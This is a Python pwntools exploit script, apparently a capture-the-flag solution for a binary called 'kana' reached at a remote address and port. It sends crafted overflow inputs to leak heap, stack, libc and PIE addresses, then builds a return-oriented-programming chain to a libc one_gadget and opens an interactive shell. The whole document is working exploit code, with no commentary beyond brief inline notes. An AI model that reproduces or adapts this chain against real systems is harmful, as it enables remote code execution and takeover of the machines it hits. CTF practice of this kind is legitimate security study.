from pwn import *

exe = ELF("./kana_patched")
libc = ELF("./libc-2.35.so")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.arch = "amd64"
context.encoding = "latin"
context.log_level = "INFO"
warnings.simplefilter("ignore")

remote_url = "167.99.86.8"
remote_port = 32728
gdbscript = """
"""


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            # gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r


r = conn()
r.sendlineafter(b">> ", b"4")
r.sendlineafter(b">> ", b"b" * 0x20)

# Leak heap
r.sendlineafter(b">> ", b"a" * 0x5C + b"\xaf" * 1 + b"c" * 0x10)
r.recvuntil(b" : ")
out = r.recvline()
leaked_heap = u64(out[8:16])
log.info(f"leaked_heap = {hex(leaked_heap)}")
good_heap_offset = -0x23E8  # Contains stack address
target_heap = leaked_heap + good_heap_offset
log.info(f"target_heap = {hex(target_heap)}")

# Leak stack
r.sendlineafter(
    b">> ", b"a" * 0x5C + b"\xaf" * 1 + b"c" * 0x10 + p64(target_heap) + p64(0x20)
)
r.recvuntil(b": ")
out = r.recvline()
leaked_stack = u64(out[:6].ljust(8, b"\x00"))
log.info(f"leaked_stack = {hex(leaked_stack)}")
good_stack_offset = 0xB0  # Contains libc address
target_stack = leaked_stack + good_stack_offset

# Leak libc
r.sendlineafter(
    b">> ", b"a" * 0x5C + b"\xaf" * 1 + b"c" * 0x10 + p64(target_stack) + p64(0x20)
)
r.recvuntil(b": ")
out = r.recvline()
leaked_libc = u64(out[:6].ljust(8, b"\x00"))
libc.address = leaked_libc - 0x29D90
log.info(f"leaked_libc = {hex(leaked_libc)}")
log.info(f"libc_base = {hex(libc.address)}")

# Leak PIE
target_stack = leaked_stack - 0x20
r.sendlineafter(
    b">> ", b"a" * 0x5C + b"\xaf" * 1 + b"c" * 0x10 + p64(target_stack) + p64(0x20)
)
r.recvuntil(b": ")
out = r.recvline()
leaked_pie = u64(out[:6].ljust(8, b"\x00"))
pie_base = leaked_pie - 0x6C68
log.info(f"pie_base = {hex(pie_base)}")

# ROP to one_gadget
log.info(f"Try to ROP...")
pop_rsi_rbp = pie_base + 0x000000000000605F
pop_rdx = pie_base + 0x0000000000006022
one_gadget = libc.address + 0xEBCF8  # rbp-0x48 writable, rbp-0x50 null, r12 null
rbp = leaked_stack

payload = b"a" * 0x6B
payload += p64(rbp)
payload += p64(pop_rsi_rbp) + p64(0) + p64(rbp)
payload += p64(pop_rdx) + p64(0)
payload += p64(one_gadget)
r.sendlineafter(b">> ", payload)
r.interactive()
